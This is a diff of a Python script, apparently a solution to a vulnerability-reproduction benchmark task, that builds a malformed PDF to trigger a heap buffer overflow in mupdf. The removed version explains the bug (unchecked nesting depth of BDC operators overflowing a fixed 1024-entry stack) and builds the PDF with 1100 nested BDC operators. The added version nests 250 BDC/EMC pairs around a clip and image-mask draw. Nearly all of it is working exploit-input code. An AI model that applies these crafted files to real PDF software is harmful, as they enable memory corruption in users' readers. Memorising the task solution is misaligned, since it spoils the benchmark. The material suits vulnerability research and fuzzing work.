@@ -1,87 +1,77 @@
 import sys
 
-class Solution:
-    def solve(self, src_path: str) -> bytes:
-        """
-        Generates a Proof-of-Concept input that triggers a Heap Buffer Overflow
-        in a PDF parser due to an unchecked nesting depth.
+class _PDFBuilder:
+    def __init__(self):
+        self.objects = []
 
-        The vulnerability, identified as oss-fuzz:42537171, occurs in mupdf.
-        Specifically, the `fz_push_clip_stack` function does not check the stack
-        depth before pushing a new element. This function is called when processing
-        a 'BDC' (Begin Marked Content) operator. The corresponding stack
-        (`gstate->clip_depth_stack`) has a fixed size of 1024.
+    def add_object(self, obj_num, content_bytes):
+        self.objects.append((obj_num, content_bytes))
 
-        This PoC constructs a minimal, valid PDF file containing a content stream
-        with more than 1024 nested 'BDC' operators without corresponding 'EMC'
-        (End Marked Content) operators. This overflows the stack, triggering the
-        vulnerability.
-        """
-
-        # The stack's capacity is 1024. We need more operations to overflow.
-        # 1100 repetitions provide a safe margin.
-        repetitions = 1100
-        
-        # A minimal valid 'BDC' operation sequence is '/T <<>> BDC '.
-        # 'T' is a tag, and '<<>>' is an empty inline properties dictionary.
-        payload = b'/T <<>> BDC ' * repetitions
-
-        # We construct a valid PDF structure by hand, calculating byte offsets for
-        # the cross-reference (xref) table.
-        
+    def build(self):
+        pdf = b"%PDF-1.7\n\x80\x81\x82\x83\n"
         offsets = {}
         
-        # PDF Header
-        # Includes a binary comment to ensure it's treated as a binary file.
-        header = b'%PDF-1.7\n%\xde\xad\xbe\xef\n'
-        current_offset = len(header)
+        sorted_objects = sorted(self.objects, key=lambda x: x[0])
+        
+        for obj_num, content in sorted_objects:
+            offsets[obj_num] = len(pdf)
+            pdf += f"{obj_num} 0 obj\n".encode('latin-1')
+            pdf += content
+            pdf += b"\nendobj\n"
+            
+        xref_offset = len(pdf)
+        pdf += b"xref\n"
+        
+        max_obj_num = 0
+        if sorted_objects:
+            max_obj_num = sorted_objects[-1][0]
+        
+        pdf += f"0 {max_obj_num + 1}\n".encode('latin-1')
+        pdf += b"0000000000 65535 f \n"
+        
+        for i in range(1, max_obj_num + 1):
+            if i in offsets:
+                pdf += f"{offsets[i]:010d} 00000 n \n".encode('latin-1')
+            else:
+                pdf += b"0000000000 65535 f \n"
+            
+        root_obj_num = self.objects[0][0]
+        pdf += b"trailer\n"
+        pdf += f"<< /Size {max_obj_num + 1} /Root {root_obj_num} 0 R >>\n".encode('latin-1')
+        pdf += b"startxref\n"
+        pdf += f"{xref_offset}\n".encode('latin-1')
+        pdf += b"%%EOF\n"
+        
+        return pdf
 
-        # Object 1: Catalog
-        offsets[1] = current_offset
-        obj1 = b'1 0 obj\n<</Type/Catalog/Pages 2 0 R>>\nendobj\n'
-        current_offset += len(obj1)
-        
-        # Object 2: Pages Collection
-        offsets[2] = current_offset
-        obj2 = b'2 0 obj\n<</Type/Pages/Count 1/Kids[3 0 R]>>\nendobj\n'
-        current_offset += len(obj2)
-        
-        # Object 3: Page Object
-        offsets[3] = current_offset
-        obj3 = b'3 0 obj\n<</Type/Page/Parent 2 0 R/MediaBox[0 0 10 10]/Contents 4 0 R>>\nendobj\n'
-        current_offset += len(obj3)
-        
-        # Object 4: Content Stream containing the payload
-        offsets[4] = current_offset
-        obj4_parts = [
-            f'4 0 obj\n<</Length {len(payload)}>>\nstream\n'.encode('ascii'),
-            payload,
-            b'\nendstream\nendobj\n'
-        ]
-        obj4 = b''.join(obj4_parts)
-        current_offset += len(obj4)
-        
-        # Cross-Reference (xref) Table
-        xref_offset = current_offset
-        xref_parts = [b'xref\n0 5\n0000000000 65535 f \n']
-        for i in range(1, 5):
-            xref_parts.append(f'{offsets[i]:010d} 00000 n \n'.encode('ascii'))
-        xref = b''.join(xref_parts)
-        
-        # PDF Trailer
-        trailer = b'trailer\n<</Size 5/Root 1 0 R>>\n'
-        
-        # startxref and End-Of-File marker
-        startxref = f'startxref\n{xref_offset}\n%%EOF'.encode('ascii')
+class Solution:
+    def solve(self, src_path: str) -> bytes:
+        builder = _PDFBuilder()
 
-        # Assemble the final PDF byte string
-        return b''.join([
-            header,
-            obj1,
-            obj2,
-            obj3,
-            obj4,
-            xref,
-            trailer,
-            startxref
-        ])
+        NESTING_DEPTH = 250
+
+        bdc_part = b"/T1 BDC " * NESTING_DEPTH
+        emc_part = b"EMC " * NESTING_DEPTH
+        trigger = b"q 0 0 1 1 re W n /Im1 Do Q"
+        page_payload = bdc_part + trigger + emc_part
+
+        builder.add_object(1, b"<< /Type /Catalog /Pages 2 0 R >>")
+        builder.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
+        
+        page_resources = b"<< /XObject << /Im1 5 0 R >> /Properties << /T1 6 0 R >> >>"
+        page_dict = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources " + page_resources + b" >>"
+        builder.add_object(3, page_dict)
+        
+        stream = f"<< /Length {len(page_payload)} >>\nstream\n".encode('latin-1') + page_payload + b"\nendstream"
+        builder.add_object(4, stream)
+        
+        img_stream_data = b"\x00"
+        img_dict = f"""<< /Type /XObject /Subtype /Image /Width 1 /Height 1 /ImageMask true
+   /ColorSpace /DeviceGray /BitsPerComponent 1 /Length {len(img_stream_data)} >>
+stream
+""".encode('latin-1') + img_stream_data + b"\nendstream"
+        builder.add_object(5, img_dict)
+        
+        builder.add_object(6, b"<< /Type /Group /S /Transparency /CS /DeviceRGB /I false /K false >>")
+        
+        return builder.build()
